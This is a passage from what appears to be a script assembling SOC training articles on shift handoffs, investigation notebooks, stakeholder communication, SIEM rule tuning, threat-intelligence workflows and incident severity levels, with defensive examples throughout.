- Don't skip the handoff because "nothing happened" -- knowing the shift was quiet is itself valuable context.
- Don't rush the handoff to leave early -- 10 minutes of good handoff prevents hours of rework.

---

## Handling Ongoing Investigations Across Shifts

When a complex investigation spans multiple shifts, use an **investigation state document**:

```
INVESTIGATION: INC-2025-0142 BEC Compromise

HYPOTHESIS: Attacker gained access via phishing, set up email forwarding rules
            to exfiltrate financial communications.

EVIDENCE MAP:
  [x] Initial phishing email identified (MSG-ID: abc123@mail.com)
  [x] Login from anomalous IP confirmed (45.33.22.11, VPN service)
  [x] Forwarding rule to external address found (evil@protonmail.com)
  [ ] OAuth app audit -- IN PROGRESS (need Global Admin)
  [ ] Full mailbox search for data exfiltration scope
  [ ] Check if other executives received similar phishing emails
  [ ] Interview CFO about any unusual email activity noticed

TIMELINE SO FAR:
  2025-03-14 09:12 UTC - Phishing email delivered
  2025-03-14 09:18 UTC - User clicked link (proxy log)
  2025-03-14 09:19 UTC - Credential harvesting page accessed
  2025-03-14 09:45 UTC - Anomalous login from 45.33.22.11
  2025-03-14 09:47 UTC - Forwarding rule created
  2025-03-14 18:00 UTC - Forwarding rule discovered by SOC

CONTAINMENT STATUS:
  [x] Password reset forced
  [x] Active sessions revoked
  [x] Forwarding rule removed
  [ ] OAuth apps reviewed (BLOCKED -- need admin access)
```

This document travels with the incident and gives any analyst full context in under 2 minutes.

---

## Measuring Handoff Quality

| Metric | How to Measure | Target |
|--------|---------------|--------|
| Handoff completion rate | % of shifts with documented handoff | 100% |
| Handoff duration | Time spent in handoff meeting | 10-15 min |
| Dropped investigations | Incidents stalled >4h after shift change | 0 per month |
| Re-triage rate | Alerts closed then reopened by next shift | <5% |
| Incoming shift confidence | Survey (1-5 scale): "I felt prepared" | >4.0 average |

---

## References

- NASA crew handoff procedures -- inspiration for critical operations handoff
- SANS SEC450: SOC Operations -- shift management
- "The Checklist Manifesto" by Atul Gawande -- applying checklist discipline to operations
- Joint Commission (healthcare) handoff standards -- SBAR framework adapted for SOC
"""
    ))

    # ---------- Article 5 ----------
    articles.append((
        "Analyst Notebook Structured Investigation Documentation",
        ["soc-operations", "documentation", "investigation", "methodology"],
        r"""# Analyst Notebook: Structured Investigation Documentation

## Why You Need an Investigation Notebook

Every experienced analyst develops a personal system for tracking their work during complex investigations. The difference between a junior and senior analyst is often not raw skill but the discipline of structured documentation during the chaos of an active incident.

An investigation notebook is your scratch pad, evidence log, and decision record rolled into one. It is separate from the formal incident ticket -- it is *your* working document that feeds into the ticket.

---

## The Investigation Notebook Format

### Header Block

Start every investigation with a header:

```
=== INVESTIGATION NOTEBOOK ===
Incident/Alert: [ID]
Started: [Date Time UTC]
Analyst: [Your Name]
Initial Hypothesis: [What you think happened based on the alert]
Classification: [Alert Type -- e.g., malware, phishing, data exfil, account compromise]
```

### Evidence Log

Record every piece of evidence as you find it. Use sequential numbering.

```
E001 | 2025-03-15 14:22 UTC | Firewall log shows outbound connection
     | Source: Palo Alto query "src=10.5.3.44 AND dest_port=443"
     | Finding: 3 connections to 198.51.100.44 between 14:00-14:12 UTC
     | Significance: Matches C2 pattern -- regular 4-minute interval beaconing

E002 | 2025-03-15 14:28 UTC | EDR process tree for WKSTN-FIN-023
     | Source: CrowdStrike Falcon, host search
     | Finding: chrome.exe (PID 4412) spawned powershell.exe (PID 7788)
     |          at 13:58 UTC. PowerShell executed encoded command.
     | Significance: Browser-to-PowerShell is T1059.001. Decoded command
     |              is a download cradle for the C2 IP in E001.

E003 | 2025-03-15 14:35 UTC | User identity for WKSTN-FIN-023
     | Source: DHCP/DNS logs, Active Directory
     | Finding: User jsmith@corp.local, Finance department, senior accountant
     | Significance: Finance user = higher risk for BEC/financial fraud motive
```

### Hypothesis Tracking

Maintain a running list of hypotheses as they evolve:

```
HYPOTHESES:
  H1: [ACTIVE] User visited compromised website which delivered exploit kit
      leading to Cobalt Strike beacon installation.
      Supporting: E001 (C2 beaconing), E002 (browser-to-PS execution chain)
      Against: None yet
      Confidence: Medium-High

  H2: [ELIMINATED] User intentionally ran malicious tool
      Supporting: None
      Against: E002 shows browser as parent (not manual execution)
      Confidence: Eliminated at 14:35 UTC

  H3: [NEEDS TESTING] Phishing email with malicious link preceded the browsing
      Supporting: Finance users are common phishing targets
      Against: No email evidence examined yet
      Test: Check email gateway logs for jsmith in the 30 min before first C2 connection
```

### Action Log

Track every action you take, not just what you find:

```
ACTIONS:
  A001 | 14:40 UTC | Isolated WKSTN-FIN-023 via CrowdStrike network containment
  A002 | 14:42 UTC | Notified Tier 2 lead (M. Rodriguez) via Teams + ticket update
  A003 | 14:45 UTC | Submitted PowerShell payload to sandbox for detonation
  A004 | 14:50 UTC | Queried email gateway for jsmith last 2 hours -- PENDING RESULTS
  A005 | 14:55 UTC | Searched SIEM for any other hosts connecting to 198.51.100.44
```

### Questions and Gaps

Maintain a list of open questions:

```
OPEN QUESTIONS:
  Q1: Was jsmith the only recipient of the phishing email? (A004 pending)
  Q2: Did the Cobalt Strike beacon successfully exfiltrate data? (Need proxy logs)
  Q3: Are there any other beacons on the network? (A005 pending)
  Q4: How long was the beacon active before detection? (Need full DNS history)

ACCESS GAPS:
  - No access to email gateway admin console (requested from IT)
  - Proxy logs only available for last 7 days (may need backup restore for longer)
  - Cannot pull memory dump remotely -- requires on-site IT support
```

---

## Investigation Flow Diagram

Structure your investigation in phases:

```
Phase 1: SCOPE          Phase 2: DEPTH          Phase 3: BREADTH
(What happened?)        (How did it happen?)    (How far did it spread?)

- Read the alert        - Process tree analysis  - Lateral movement check
- Identify key hosts    - Network flow analysis  - Search for similar IOCs
- Identify key users    - Malware analysis       - Check other users/hosts
- Set initial scope     - Timeline construction  - Assess data exposure
                        - Root cause analysis
```

### Phase 1 Checklist

- [ ] Read the alert details completely (including raw event data)
- [ ] Identify all hosts involved (IP to hostname to user mapping)
- [ ] Check if this alert is related to any open incidents
- [ ] Set your initial hypothesis
- [ ] Determine containment urgency (can this wait for analysis or must you act now?)

### Phase 2 Checklist

- [ ] Build the process tree on affected hosts
- [ ] Analyze network connections (source, destination, volume, timing)
- [ ] Check threat intelligence for all IOCs found
- [ ] Review authentication logs for affected users
- [ ] Examine file system changes (new files, modified files, deleted files)
- [ ] Decode any obfuscated commands or payloads
- [ ] Map findings to MITRE ATT&CK techniques

### Phase 3 Checklist

- [ ] Search for same IOCs across all monitored systems
- [ ] Check for lateral movement indicators (PsExec, WMI, RDP, SMB)
- [ ] Review email for other recipients of the initial delivery mechanism
- [ ] Check if any data was exfiltrated (DLP, proxy, DNS tunneling)
- [ ] Determine the blast radius -- what was the attacker's maximum access?

---

## MITRE ATT&CK Mapping Table

For each investigation, maintain a mapping:

| Technique ID | Technique Name | Evidence | Confidence |
|-------------|----------------|----------|------------|
| T1566.002 | Spearphishing Link | E003 - phishing email to jsmith | High |
| T1059.001 | PowerShell | E002 - encoded PowerShell command | High |
| T1071.001 | Web Protocols (C2) | E001 - HTTPS beaconing to C2 IP | High |
| T1057 | Process Discovery | E005 - tasklist.exe executed | Medium |
| T1082 | System Information Discovery | E005 - systeminfo.exe executed | Medium |

This mapping feeds directly into your incident report and helps the team understand the adversary's playbook.

---

## Notebook Best Practices

### Do

- **Start the notebook immediately** when you begin investigating, not after.
- **Timestamp everything** in UTC.
- **Number your evidence** sequentially -- it makes cross-referencing easy.
- **Record dead ends** -- "Checked X, found nothing" prevents duplicate work.
- **Update hypotheses in real time** -- cross out eliminated hypotheses; do not delete them.
- **Back up your notebook** -- paste it into the ticket periodically so it survives a browser crash.

### Don't

- Don't rely on memory -- you will forget details within hours.
- Don't mix investigation notes with formal reporting -- the notebook is raw; the report is polished.
- Don't skip recording "obvious" things -- what is obvious at 2 PM is a mystery at 2 AM.
- Don't keep evidence only in tool consoles -- export, screenshot, or transcribe key findings.

---

## Converting Notebook to Incident Report

When the investigation concludes, your notebook feeds the formal report:

| Notebook Section | Report Section |
|-----------------|----------------|
| Header Block | Incident Summary |
| Evidence Log | Findings and Analysis |
| Hypothesis Tracking | Root Cause Analysis |
| Action Log | Response Actions |
| ATT&CK Mapping | Adversary Profile |
| Open Questions | Recommendations and Gaps |

The notebook is your raw material. The report is the refined product. Never submit a raw notebook as a report, but never write a report without a notebook behind it.

---

## References

- SANS FOR508: Advanced Incident Response -- investigation documentation standards
- Intelligence-Driven Incident Response (Reese/Roberts) -- structured analysis for IR
- MITRE ATT&CK Navigator -- for visual technique mapping
- Palantir Alerting and Detection Strategy Framework -- structured investigation approach
"""
    ))

    # ---------- Article 6 ----------
    articles.append((
        "Communicating Technical Findings to Non-Technical Stakeholders",
        ["communication", "reporting", "stakeholder-management", "soc-operations"],
        r"""# Communicating Technical Findings to Non-Technical Stakeholders

## The Communication Gap

You found a Cobalt Strike beacon with lateral movement to three domain controllers. You know this is catastrophic. Your CISO needs to brief the board in an hour. The legal team needs to decide whether to notify customers. The CEO wants to know if the company is safe.

None of them care about PowerShell execution chains, JA3 hashes, or MITRE technique IDs. They need to understand **what happened, what it means for the business, and what to do about it**.

Bridging this gap is one of the most important skills a SOC analyst can develop.

---

## The BLUF Principle: Bottom Line Up Front

Military briefings put the conclusion first. SOC communications should do the same.

**Bad approach:**
> "We detected a DNS anomaly at 14:00 UTC which led us to investigate network flows where we discovered TLS connections to a known Cobalt Strike C2 server at 198.51.100.44 which was confirmed via JA3 fingerprint matching and we then found lateral movement via SMB to three domain controllers using pass-the-hash..."

**Good approach:**
> "An attacker has gained access to our network and reached our most critical systems. We have contained the breach but need to take three servers offline for 48 hours to ensure they are clean. No customer data has been confirmed stolen, but we cannot rule it out yet."

The BLUF format:
1. **What happened** (one sentence, business impact)
2. **What we did about it** (actions taken)
3. **What we need** (decisions, resources, time)
4. **What we don't know yet** (honest gaps)

---

## Audience-Specific Communication

### For the CISO

**What they need:**
- Risk assessment in business terms
- Regulatory implications
- Resource needs and budget impact
- Timeline for resolution
- Comparison to industry benchmarks

**Template:**

```
INCIDENT BRIEF: [Title]
SEVERITY: [Critical/High/Medium/Low]
BUSINESS IMPACT: [Operational, financial, reputational, regulatory]
CURRENT STATUS: [Contained/Active/Resolved]

SUMMARY:
[2-3 sentences: what happened, how far it got, what we did]

RISK ASSESSMENT:
- Data exposure: [Yes/No/Unknown] -- [details]
- Regulatory notification required: [Yes/No/Under review]
- Operational impact: [Systems affected and business processes disrupted]
- Estimated recovery time: [Hours/Days]

RESOURCE NEEDS:
- [What you need and why]

NEXT BRIEFING: [Time]
```

### For Legal / Compliance

**What they need:**
- Was regulated data accessed or exfiltrated?
- What is the evidence basis for your conclusions?
- What are the notification timelines (GDPR: 72h, HIPAA: 60 days, etc.)?
- What logs and evidence are being preserved?
- Chain of custody considerations

**Key phrases to use:**
- "Based on available evidence..." (not "I think" or "probably")
- "We can confirm..." vs. "We cannot confirm or deny..."
- "Forensic evidence shows..." (not "we found")
- "The investigation is ongoing; this assessment may change as new evidence emerges"

### For Executive Leadership (CEO / Board)

**What they need:**
- Is the company safe right now?
- What is the financial exposure?
- Will this become public?
- What are we doing about it?
- How do we prevent this in the future?

**Rules for executive communication:**
- No jargon. None. Zero.
- Use analogies: "The attacker got into the building, reached the vault, but we caught them before they opened it."
- Quantify in dollars and time, not technical metrics.
- Be honest about what you don't know.
- Provide options, not just problems.

---

## Translation Guide: Technical to Business Language

| Technical Finding | Business Translation |
|------------------|---------------------|
| Cobalt Strike C2 beacon detected | An attacker has remote control of a company computer |
| Lateral movement to domain controller | The attacker reached our most critical identity systems |
| Credential harvesting via Mimikatz | The attacker stole passwords that could give them access to many systems |
| Data exfiltration over DNS tunnel | Company data was secretly sent out of our network |
| Privilege escalation to SYSTEM | The attacker gained full control of the affected computer |
| Ransomware pre-staging detected | We caught the attacker preparing to encrypt our files before they could execute |
| Phishing with weaponized attachment | An employee received a fake email with a malicious file designed to hack their computer |
| Supply chain compromise | A trusted vendor's software was tampered with, and the tampered version was installed in our network |
| Zero-day exploit | The attacker used a previously unknown software flaw for which no fix exists yet |

---

## Visualization for Non-Technical Audiences

### Timeline Diagrams

Instead of log timestamps, create a visual timeline:

```
Mon 9 AM        Mon 2 PM       Mon 6 PM       Tue 9 AM
    |               |              |               |
    v               v              v               v
Phishing      Attacker         Attacker        SOC detects
email         gains            reaches         and contains
delivered     access           critical        the attacker
                               systems
              <-- 4 hours -->  <-- 15 hours -->
              Attacker active undetected
```

### Impact Radius Diagrams

Show scope of impact visually:

```
  Confirmed Compromised:
    [WKSTN-FIN-023] --- [DC-01] --- [DC-02]
                                 \-- [DC-03]

  Under Investigation:
    [FILE-SERVER-01]  [EXCH-01]

  Confirmed Clean:
    [All other workstations] [Web servers] [Database servers]
```

---

## Briefing Formats by Urgency

### Critical (Active Breach) -- Verbal + Written Follow-up

1. **Phone/Teams call within 15 minutes** of confirmation
2. Say: "We have confirmed a security breach. Here is what we know so far."
3. Cover: what happened, what you did, what you need
4. Duration: 5 minutes max
5. Follow up with written brief within 1 hour

### High (Contained Incident) -- Written Brief + Optional Call

1. Written brief via email or incident management system
2. Offer a call to discuss questions
3. Provide timeline for next update

### Medium/Low (Resolved or Minor) -- Written Summary

1. Include in regular SOC reporting
2. Highlight lessons learned
3. Note any budget or resource implications

---

## Common Mistakes in Stakeholder Communication

| Mistake | Impact | Better Approach |
|---------|--------|-----------------|
| Leading with technical details | Audience loses interest and trust | Lead with business impact |
| Using jargon | Audience feels excluded and confused | Translate everything to plain language |
| Downplaying severity | Organization under-responds | Be honest; let leadership decide the response level |
| Over-stating certainty | Loss of credibility when facts evolve | Use confidence qualifiers; state what you know vs. suspect |
| Not providing options | Leadership feels helpless | Always provide recommended actions with trade-offs |
| Delaying communication | Lost trust, delayed response | Communicate early, update often; first report can be brief |
| Only communicating bad news | SOC seen as cost center | Also report prevented attacks, improvements, and wins |

---

## Preparing for Q&A

Stakeholders will ask questions. Prepare for the top 5:

1. **"Are we safe now?"** -- Have a clear yes/no/partially answer with conditions
2. **"How did this happen?"** -- Simplified root cause, no blame
3. **"Could it happen again?"** -- Honest assessment with remediation steps
4. **"Do we need to notify customers/regulators?"** -- Facts only; defer to legal for the decision
5. **"How much will this cost?"** -- If you do not know, say so and provide a timeline for an estimate

---

## Building a Communication Practice

- **Pre-write templates** for common scenarios (malware, phishing, data breach, ransomware)
- **Practice translating** -- take your last 5 incident reports and rewrite the summary for a CEO audience
- **Get feedback** -- ask your CISO or manager to review your stakeholder communications
- **Read the news** -- study how breaches are reported publicly; note what is clear and what is confusing

---

## References

- NIST SP 800-61: Incident communications (Section 2.3.4)
- SANS Institute: "Writing and Communicating Security Findings"
- "Made to Stick" (Heath & Heath) -- principles for clear communication
- "The Pyramid Principle" (Barbara Minto) -- structured business communication
"""
    ))

    # ---------- Article 7 ----------
    articles.append((
        "Tuning SIEM Rules Reducing Noise Without Losing Signal",
        ["siem", "detection-engineering", "tuning", "alert-fatigue"],
        r"""# Tuning SIEM Rules: Reducing Noise Without Losing Signal

## The Tuning Paradox

Every SOC faces the same tension: cast a wide net and drown in false positives, or tighten the rules and risk missing real attacks. Tuning is not a one-time activity -- it is a continuous process of calibration that balances detection coverage against analyst workload.

**A rule that fires 500 times a day and is ignored is worse than having no rule at all.** It trains analysts to dismiss alerts, creates dashboard clutter, and hides real attacks in noise.

---

## The Tuning Process

### Step 1: Identify Rules to Tune

Start with data. Pull your alert volume by rule for the past 30 days:

```
| Rule Name                          | Fires/Day | FP Rate | Escalation Rate |
|------------------------------------|-----------|---------|-----------------|
| Suspicious PowerShell Execution    | 342       | 94%     | 2%              |
| Failed Login Brute Force           | 187       | 88%     | 3%              |
| Outbound DNS to Rare Domain        | 456       | 97%     | 0.5%            |
| Lateral Movement via SMB           | 23        | 35%     | 40%             |
| Malware Detected by EDR            | 15        | 5%      | 85%             |
```

**Priority for tuning:** High volume + high FP rate. In this example, "Outbound DNS to Rare Domain" is the top candidate.

### Step 2: Analyze False Positive Patterns

For the target rule, pull a sample of 50-100 recent alerts marked as FP. Categorize them:

```
Outbound DNS to Rare Domain -- FP Analysis (n=75):
  - 34 (45%): CDN/cloud service domains (Akamai, CloudFront, Azure)
  - 18 (24%): Newly registered but legitimate SaaS domains
  - 12 (16%): Developer tools and package managers (npm, pypi, Docker Hub)
  - 7 (9%):  Browser telemetry / ad tracking domains
  - 4 (5%):  Actual suspicious -- warranted investigation
```

Now you know exactly where to cut.

### Step 3: Design Tuning Changes

For each FP category, choose a tuning approach:

| FP Category | Tuning Approach | Risk |
|-------------|----------------|------|
| CDN/cloud domains | Whitelist top 50 CDN domain patterns | Low -- CDNs are well-known |
| New SaaS domains | Add domain age threshold (>7 days = skip) | Medium -- attackers also use aged domains |
| Dev tools | Whitelist known package registries | Low -- static list |
| Ad tracking | Whitelist known ad networks | Low |

### Step 4: Implement Incrementally

Never tune everything at once. Apply one change at a time and measure the impact over 7 days.

```
Week 1: Baseline -- 456 alerts/day, 97% FP rate
Week 2: Add CDN whitelist -- expected reduction: ~45%
  Result: 251 alerts/day, 94% FP rate
Week 3: Add dev tool whitelist -- expected reduction: ~16%
  Result: 178 alerts/day, 91% FP rate
Week 4: Add domain age filter (>7 days)
  Result: 89 alerts/day, 78% FP rate
```

### Step 5: Validate Detection Still Works

After tuning, confirm the rule still detects what it should:

- **Replay known-bad traffic** from past incidents through the rule
- **Run a purple team test** with IOCs that should trigger the rule
- **Check that the true positive rate held** -- if escalation rate dropped, you may have over-tuned

---

## Tuning Techniques

### Whitelisting (Exclusion Lists)

Most common approach. Exclude known-benign sources.

**Best practices:**
- Whitelist as narrowly as possible: IP + port + destination, not just IP
- Document *why* each entry was added, *who* added it, and *when*
- Set review dates -- whitelist entries should expire and require re-justification
- Use dynamic whitelists from CMDB where possible (e.g., "all servers tagged as vulnerability-scanner")

```
# Example: Narrow vs. Broad whitelist
# BAD: Whitelists all traffic from scanner
NOT (src_ip = "10.1.1.50")

# GOOD: Whitelists specific scanner behavior
NOT (src_ip = "10.1.1.50" AND dest_port IN (80, 443, 8080, 8443)
     AND process_name = "nessus_scanner.exe")
```

### Threshold Adjustment

Change the trigger conditions rather than excluding sources.

```
# Before: Alerts on any failed login
event_type = "authentication_failure"

# After: Alerts on 10+ failures in 5 minutes from same source
event_type = "authentication_failure"
| stats count by src_ip, user span=5m
| where count >= 10
```

### Enrichment-Based Filtering

Add context from external sources to filter at detection time.

```
# Before: Alert on any connection to IP not in whitelist
NOT dest_ip IN (known_good_list)

# After: Alert only if destination IP has TI match or is in a suspicious ASN
lookup threat_intel_feed dest_ip OUTPUT ti_score
lookup asn_database dest_ip OUTPUT asn_name, asn_risk
| where ti_score > 0 OR asn_risk = "high"
```

### Time-Based Suppression

Reduce noise during known-noisy periods.

```
# Suppress vulnerability scanner alerts during scheduled scan windows
NOT (src_ip = "10.1.1.50"
     AND _time >= relative_time(now(), "@d+2h")
     AND _time <= relative_time(now(), "@d+6h")
     AND day_of_week IN ("tuesday", "thursday"))
```

### Behavioral Baselining

Instead of static thresholds, use learned baselines.

```
# Alert when DNS query volume exceeds 3 standard deviations above
# the host's 30-day average
| stats avg(query_count) as baseline, stdev(query_count) as sd by host
| where current_query_count > (baseline + 3 * sd)
```

---

## The Tuning Ledger

Maintain a record of every tuning change:

```markdown
## Tuning Ledger

| Date | Rule | Change | Reason | Analyst | Review Date |
|------|------|--------|--------|---------|-------------|
| 2025-03-01 | DNS-001 | Added CDN whitelist (47 patterns) | 45% of FPs were CDN | jdoe | 2025-06-01 |
| 2025-03-08 | DNS-001 | Added domain age > 7d filter | New SaaS domains causing 24% FP | jdoe | 2025-04-08 |
| 2025-03-15 | PS-003 | Raised threshold from 1 to 3 encoded commands/hour | Admin scripts triggering FPs | mchen | 2025-06-15 |
| 2025-03-15 | PS-003 | Excluded SCCM server 10.1.2.100 | Software deployment triggers | mchen | 2025-06-15 |
```

---

## When NOT to Tune

Not every noisy rule should be tuned. Sometimes the answer is to **replace the rule** with a better detection.

**Signs the rule needs replacement, not tuning:**
- FP rate stays above 80% after multiple tuning passes
- The detection logic is fundamentally flawed (e.g., alerting on a field that is not reliable)
- The threat landscape has changed and the rule targets obsolete TTPs
- A better data source exists that would make the detection more precise

**Signs you should tune, not disable:**
- The rule catches real attacks (proven by past TPs) but also catches benign activity
- The FPs follow clear, documentable patterns
- The rule aligns with a priority threat in your threat model

---

## Measuring Tuning Effectiveness

Track these metrics monthly for every rule:

| Metric | Definition | Target |
|--------|-----------|--------|
| Alert volume | Total fires per day | Trending down after tuning |
| FP rate | % of alerts closed as FP | <30% for high-value rules |
| TP rate | % of alerts confirmed as TP | Stable or increasing |
| Mean time to triage | Avg time to disposition an alert | Decreasing |
| Coverage gaps | Attacks that should have triggered the rule but did not | 0 |
| Whitelist size | Number of exclusion entries | Growing slowly, not exponentially |

---

## References

- MITRE ATT&CK: Detection coverage mapping
- Palantir: Alerting and Detection Strategy Framework
- SpecterOps: Detection engineering methodology
- "Crafting the InfoSec Playbook" (Bollinger, Enright, Valites) -- tuning detection systems
- SANS SEC555: SIEM with Tactical Analytics -- tuning practices
"""
    ))

    # ---------- Article 8 ----------
    articles.append((
        "Building a Personal Threat Intelligence Workflow",
        ["threat-intelligence", "workflow", "professional-development", "soc-operations"],
        r"""# Building a Personal Threat Intelligence Workflow

## Why Every Analyst Needs a TI Workflow

Threat intelligence is not just for dedicated TI teams. Every SOC analyst benefits from a personal system for consuming, processing, and applying threat intelligence to their daily work.

Without a workflow, you either ignore TI entirely (and miss important context) or drown in a firehose of reports, tweets, and advisories that you never have time to read.

The goal: **spend 30-60 minutes per day on TI and come away with actionable knowledge that improves your detection and investigation work.**

---

## The Four Phases of Personal TI

### Phase 1: Collect (15 minutes/day)

Aggregate sources into a single reading queue. Do not browse sources individually.

**Recommended Setup:**

| Source Type | Examples | Tool |
|------------|---------|------|
| RSS feeds | Vendor blogs, CISA, MITRE | Feedly, Inoreader, or similar |
| Social media | Twitter/X TI community, Mastodon infosec | Curated lists (not algorithmic feeds) |
| Mailing lists | Full Disclosure, oss-security, SANS NewsBites | Email filters to a dedicated folder |
| Vendor advisories | Your SIEM/EDR/AV vendor bulletins | Direct subscription |
| ISAC reports | Your industry ISAC (FS-ISAC, H-ISAC, etc.) | Portal or email digest |
| Threat reports | Mandiant, CrowdStrike, Recorded Future, Microsoft | Vendor portals, RSS |

**Collection rules:**
- Limit to 10-15 high-signal sources to start
- Prefer sources relevant to YOUR industry and technology stack
- Review weekly: if a source has not produced useful intelligence in 4 weeks, drop it

### Phase 2: Process (15 minutes/day)

Scan your reading queue and extract actionable items. Not everything needs deep reading.

**The Triage Filter:**

For each item in your queue, apply this 30-second filter:

```
1. Does this affect my industry/sector?          No -> Skip
2. Does this target technology we use?            No -> Skip
3. Does this describe a new TTP we don't detect?  Yes -> FLAG for deep read
4. Does this contain IOCs relevant to us?          Yes -> EXTRACT for watchlist
5. Is this a general awareness piece?              Yes -> SKIM for context
```

**Processing output types:**
- **IOC extraction** -- new indicators for your watchlist (see: Building and Maintaining IOC Watchlists)
- **Detection gap notes** -- TTPs described that your SIEM does not detect
- **Hunt hypotheses** -- ideas for proactive threat hunting based on new intelligence
- **Situational awareness** -- understanding of current threat landscape (no immediate action)

### Phase 3: Analyze (15 minutes/day, or as needed)

Deep-read the items you flagged in Phase 2. For each:

1. **Map to your environment**: Do we have the targeted software? Are we in the targeted sector? Do we have the same security gaps?
2. **Map to MITRE ATT&CK**: Which techniques does the threat actor use? Do we have detection coverage for those techniques?
3. **Assess relevance**: Score 1-5 for relevance to your specific organization.
4. **Determine action**: What should change in your SOC because of this intelligence?

### Phase 4: Apply (as needed)

Turn analysis into action:

| Analysis Output | Action |
|----------------|--------|
| New IOCs relevant to your environment | Add to watchlist with proper metadata |
| Detection gap for a TTP you should cover | File a detection engineering request |
| Hunt hypothesis | Add to your hunt backlog |
| Vulnerability affecting your stack | Notify vulnerability management team |
| New adversary relevant to your sector | Update your threat actor tracking sheet |

---

## The Personal TI Notebook

Maintain a running document that captures your intelligence work:

```markdown
# Personal TI Log -- Week of 2025-03-15

## Key Reports Read

### [Mandiant] APT41 Targets Manufacturing with New Backdoor
- Relevance: HIGH (we are manufacturing sector)
- TTPs: DLL search-order hijacking (T1574.001), scheduled task persistence (T1053.005)
- Detection check: We detect T1053.005 but NOT T1574.001 in non-standard dirs
- Action: Filed detection request DET-REQ-2025-044 for DLL hijacking in user-writable paths

### [CrowdStrike] Scattered Spider Shifts to SaaS Targeting
- Relevance: MEDIUM (we use some of the targeted SaaS platforms)
- TTPs: SIM swapping for MFA bypass, OAuth token theft
- Detection check: We have limited visibility into SaaS authentication anomalies
- Action: Added hunt hypothesis HH-2025-019 (look for OAuth app registrations from unusual geolocations)

## IOCs Extracted

| Indicator | Type | Source | Campaign | Added to Watchlist |
|-----------|------|--------|----------|-------------------|
| evil-domain[.]xyz | domain | Mandiant APT41 report | SteelForge | Yes |
| 198.51.100.44 | ipv4 | Mandiant APT41 report | SteelForge | Yes |
| a1b2c3d4e5...SHA256 | file hash | Mandiant APT41 report | SteelForge | Yes |

## Hunt Hypotheses Generated

- HH-2025-019: OAuth app registrations from non-corporate IP ranges in last 90 days
- HH-2025-020: DLL files in user temp directories that are loaded by high-privilege processes

## Detection Gaps Identified

- No detection for DLL search-order hijacking (T1574.001) -- request filed
- Limited SaaS authentication monitoring -- requires new log source onboarding
```

---

## Building Your Twitter/X TI List

Curate a dedicated list (not your main feed) of high-signal TI accounts:

**Categories to include:**
- Vendor threat research teams (10-15 accounts)
- Independent security researchers in your sector (5-10)
- Government/CERT accounts (3-5: CISA, your national CERT)
- MITRE ATT&CK official account
- Tool-specific researchers (for your SIEM, EDR, cloud platform)

**Curation rules:**
- Mute anyone who posts more opinion than intelligence
- Mute anyone who posts more than 20 times per day
- Review the list quarterly; remove low-signal accounts
- Use a separate app or browser profile so TI reading does not mix with personal social media

---

## Weekly and Monthly Rituals

### Weekly (30 min on Friday)

- Review your TI log entries for the week
- Check: did any of your extracted IOCs trigger alerts this week?
- Check: did any incidents this week relate to intelligence you had?
- Update your threat actor tracking sheet with new information

### Monthly (1 hour)

- Review your source list: add new, remove stale
- Audit your watchlist additions: any expired? Any with zero hits?
- Review detection gap backlog: any requests fulfilled?
- Summarize trends: what threat themes dominated this month?
- Share a brief summary with your team (5-minute standup topic)

---

## Tools for Personal TI Management

| Need | Free Options | Paid Options |
|------|-------------|-------------|
| RSS aggregation | Feedly (free tier), Miniflux | Feedly Pro, Inoreader |
| Note-taking | Obsidian, Notion (free tier) | Notion (team), Confluence |
| IOC management | MISP (self-hosted), OpenCTI | Recorded Future, ThreatConnect |
| ATT&CK mapping | ATT&CK Navigator (free) | Platform integrations |
| Social media curation | Twitter/X lists (free) | TweetDeck, Hootsuite |

---

## Common Pitfalls

### The Firehose Problem
Subscribing to every TI feed and report. You will not read them. Be selective.

### The Collection-Without-Action Problem
Reading lots of reports but never converting findings into detection rules, hunt hypotheses, or watchlist entries. Intelligence without action is just reading.

### The Recency Bias Problem
Only paying attention to the newest report. Adversaries reuse TTPs for years. Review older intelligence for persistent threats.

### The Relevance Blind Spot
Reading every APT report regardless of whether it targets your sector, geography, or technology stack. Focus on intelligence relevant to YOUR organization.

---

## References

- SANS FOR578: Cyber Threat Intelligence
- "Intelligence-Driven Incident Response" (Reese & Roberts)
- MITRE ATT&CK: Threat intelligence use cases
- Recorded Future: "The Threat Intelligence Handbook"
- David Bianco: "The Pyramid of Pain" and "The Detection Maturity Model"
"""
    ))

    # ---------- Article 9 ----------
    articles.append((
        "Incident Severity Classification with Real Examples",
        ["incident-response", "severity", "classification", "soc-operations"],
        r"""# Incident Severity Classification with Real Examples

## Why Severity Classification Matters

Severity classification determines how fast your organization responds, who gets notified, and what resources are allocated. Get it wrong in either direction and you pay a price: over-classify and you desensitize leadership with false urgency; under-classify and a real breach festers while your team moves at the wrong pace.

A consistent, documented severity scheme removes subjectivity and gives every analyst the same playbook.

---

## Four-Level Severity Model

Most mature SOCs use a four-level model. Here is a practical implementation:

### SEV-1: Critical

**Definition:** Active, confirmed security breach with significant business impact occurring now.

**Criteria (any one is sufficient):**
- Confirmed data exfiltration of regulated or sensitive data
- Ransomware actively encrypting production systems
- Compromise of identity infrastructure (domain controllers, SSO, certificate authorities)
- Active unauthorized access to financial systems
- Confirmed supply chain compromise affecting production
- Public disclosure of a breach before internal containment

**Response:**
- Incident commander assigned immediately
- War room activated (virtual or physical)
- Leadership notified within 15 minutes
- All-hands SOC engagement; other work paused
- External IR retainer engaged if needed
- Status updates every 30 minutes

**Real-World Example:**
> Friday 3 PM: EDR alerts show ransomware encryption on 3 file servers. Within 10 minutes, 15 more hosts report encryption activity. Network segmentation partially contains spread but the primary file share for the finance department is encrypted. Backups exist but the last verified restore test was 6 months ago.
>
> **Why SEV-1:** Active destructive attack, business operations disrupted, financial data at risk, restoration uncertain.

### SEV-2: High

**Definition:** Confirmed security incident with potential for significant impact but currently contained or limited in scope.

**Criteria (any one is sufficient):**
- Malware execution confirmed on endpoint(s) but contained by EDR
- Compromised user account with access to sensitive systems (credentials rotated)
- Successful phishing leading to credential theft (no confirmed misuse yet)
- Vulnerable system confirmed exploited but no lateral movement detected
- Insider threat indicators with evidence of policy violation

**Response:**
- Dedicated analyst assigned; investigation is top priority
- Tier 2/3 engaged within 1 hour
- Management notified within 2 hours
- Status updates every 2 hours
- Containment actions within 4 hours

**Real-World Example:**
> An analyst discovers a Cobalt Strike beacon on a developer workstation via EDR alert. The beacon has been communicating with a C2 server for 48 hours. EDR network containment isolates the host within 5 minutes. No lateral movement is detected. The developer had access to source code repositories.
>
> **Why SEV-2:** Confirmed compromise with sensitive access, but contained. Potential data exposure (source code) needs investigation but the active threat is neutralized.

### SEV-3: Medium

